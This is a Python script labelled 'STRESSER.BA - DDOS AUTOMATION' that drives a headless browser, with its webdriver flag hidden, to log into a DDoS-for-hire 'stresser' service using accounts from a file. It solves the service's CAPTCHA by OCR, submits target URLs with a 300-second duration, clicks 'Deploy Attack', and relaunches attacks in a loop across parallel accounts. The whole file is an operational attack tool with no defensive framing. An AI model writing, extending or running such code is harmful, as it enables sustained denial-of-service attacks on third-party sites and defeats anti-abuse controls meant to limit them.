import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import logging
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout, expect
from PIL import Image
import ddddocr

ocr = ddddocr.DdddOcr()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class DDoSNowManager:
    def __init__(self):
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.active_threads = {}
        
    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":")
                    if len(p) >= 3:
                        accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
        return accounts

    def wait_for_element(self, page, selector, timeout=30000):
        """Element görünene kadar bekle"""
        try:
            page.wait_for_selector(selector, timeout=timeout, state="visible")
            return True
        except:
            return False

    def solve_captcha(self, page):
        try:
            # Deploy butonunu bekle ve tıkla
            if not self.wait_for_element(page, "button:has-text('Deploy Attack')"):
                logger.warning("Deploy butonu bulunamadı!")
                return False
            
            deploy_btn = page.locator("button:has-text('Deploy Attack')").first
            deploy_btn.click()
            time.sleep(2)
        except Exception as e:
            logger.warning(f"Deploy butonu hatası: {e}")
            return False

        while True:
            try:
                # Captcha görselini bekle
                if not self.wait_for_element(page, "img[alt='captcha']", 10000):
                    time.sleep(1)
                    continue
                    
                img_elem = page.locator("img[alt='captcha']").first
                img_src = img_elem.get_attribute("src")
                if not img_src or not img_src.startswith("data:image"):
                    time.sleep(1)
                    continue

                base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                img_bytes = base64.b64decode(base64_data)
                img = Image.open(io.BytesIO(img_bytes))

                captcha_text = ocr.classification(img)
                captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())

                if not captcha_text:
                    time.sleep(1)
                    continue

                logger.info(f"OCR: {captcha_text}")

                # Captcha input
                captcha_input = page.locator("input[name='captcha']").first
                captcha_input.fill("")
                captcha_input.fill(captcha_text)
                time.sleep(1)

                # Deploy butonu
                deploy_btn2 = page.locator("button[type='submit']").first
                if deploy_btn2.count() == 0:
                    deploy_btn2 = page.locator("button:has-text('Deploy Attack')").last
                deploy_btn2.click()
                time.sleep(3)

                # Hata kontrolü
                if page.locator("text=Invalid captcha").count() > 0:
                    logger.info(f"Yanlış captcha: {captcha_text}")
                    captcha_input.fill("")
                    time.sleep(1)
                    continue
                else:
                    logger.info("Attack başlatıldı!")
                    return True
            except Exception as e:
                logger.error(f"Captcha hatası: {e}")
                time.sleep(2)
                continue

    def browser_worker(self, acc_id, target_url, account_data):
        username = account_data["user"]
        password = account_data["pass"]
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        stop_event = self.stop_events.get(acc_id)

        while self.running_states.get(acc_id, False):
            try:
                if os.path.exists(profile_dir):
                    try:
                        shutil.rmtree(profile_dir)
                    except:
                        pass
                os.makedirs(profile_dir, exist_ok=True)

                with sync_playwright() as p:
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox'],
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
                    )
                    page = context.new_page()
                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

                    # GİRİŞ - stresser.ba domain'i
                    logger.info(f"[{username}] Giriş sayfası...")
                    page.goto("https://stresser.ba/login", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(3)
                    
                    # Login formunu bekle
                    if not self.wait_for_element(page, "input[name='username']"):
                        logger.error(f"[{username}] Login formu bulunamadı!")
                        time.sleep(30)
                        continue
                    
                    page.fill("input[name='username']", username)
                    page.fill("input[name='password']", password)
                    page.click("button[type='submit']")
                    time.sleep(5)
                    
                    # Hub'a git
                    logger.info(f"[{username}] Hub sayfasına gidiliyor...")
                    page.goto("https://stresser.ba/hub", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(5)
                    
                    if "login" in page.url:
                        logger.error(f"[{username}] Giriş başarısız!")
                        time.sleep(30)
                        continue
                    
                    logger.info(f"[{username}] Giriş başarılı")

                    # ANA DÖNGÜ
                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                        try:
                            # Hub sayfasının yüklenmesini bekle
                            page.wait_for_load_state("networkidle", timeout=30000)
                            time.sleep(2)
                            
                            # Hedef URL inputunu bul
                            target_input = page.locator("input[placeholder*='IPv4']").first
                            if target_input.count() == 0:
                                target_input = page.locator("input[placeholder*='URL']").first
                            if target_input.count() == 0:
                                target_input = page.locator("input[name*='host']").first
                            if target_input.count() == 0:
                                target_input = page.locator("input").nth(0)
                            
                            target_input.fill(target_url, timeout=10000)
                            logger.info(f"[{username}] Hedef URL dolduruldu: {target_url}")
                            
                            # Süre inputu - slider
                            time_input = page.locator("input[type='range']").first
                            if time_input.count() == 0:
                                time_input = page.locator("input[name*='time']").first
                            if time_input.count() == 0:
                                time_input = page.locator("input").nth(1)
                            
                            time_input.fill("300", timeout=5000)
                            logger.info(f"[{username}] Süre dolduruldu: 300")
                            
                            # CAPTCHA çöz
                            logger.info(f"[{username}] CAPTCHA çözülüyor...")
                            if not self.solve_captcha(page):
                                logger.error(f"[{username}] CAPTCHA çözülemedi!")
                                page.reload()
                                time.sleep(5)
                                continue

                            logger.info(f"[{username}] Attack başladı! - {target_url}")
                            
                            # Süre takibi
                            attack_running = True
                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()) and attack_running:
                                try:
                                    # Badge kontrolü
                                    badge = page.locator(".badge").first
                                    if badge.count() > 0:
                                        time_text = badge.text_content().strip()
                                        if time_text and "s" in time_text:
                                            logger.info(f"[{username}] Kalan süre: {time_text}")
                                        if time_text in ["0m 0s", "0s", "0"]:
                                            logger.info(f"[{username}] Süre doldu!")
                                            attack_running = False
                                            break
                                    
                                    # Running kontrolü
                                    running = page.locator("text=Running").first
                                    if running.count() == 0:
                                        running = page.locator(".text-success").first
                                        if running.count() == 0:
                                            logger.info(f"[{username}] Attack bitti!")
                                            attack_running = False
                                            break
                                except Exception as e:
                                    logger.debug(f"[{username}] Süre kontrol hatası: {e}")
                                time.sleep(5)

                            if not self.running_states.get(acc_id, False):
                                break

                            logger.info(f"[{username}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(5)

                        except Exception as inner_e:
                            logger.error(f"[{username}] Adım hatası: {inner_e}")
                            page.reload()
                            time.sleep(5)
                            continue

                    context.close()

            except Exception as outer_e:
                logger.error(f"[{username}] KRİTİK HATA: {outer_e}")
                time.sleep(10)
                continue

        logger.info(f"[{username}] Durduruldu")
        self.running_states[acc_id] = False

    def start_all(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return
            
        for acc in self.accounts:
            acc_id = acc["id"]
            target = acc.get("target", "https://example.com")
            self.running_states[acc_id] = True
            self.stop_events[acc_id] = threading.Event()
            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
            self.active_threads[acc_id] = t
            t.start()
            logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
            time.sleep(3)
        
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for acc in self.accounts:
                acc_id = acc["id"]
                status = "Çalışıyor" if self.running_states.get(acc_id, False) else "Durduruldu"
                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   STRESSER.BA - DDOS AUTOMATION           ║
    ╚═══════════════════════════════════════════╝
    """)
    manager = DDoSNowManager()
    manager.start_all()
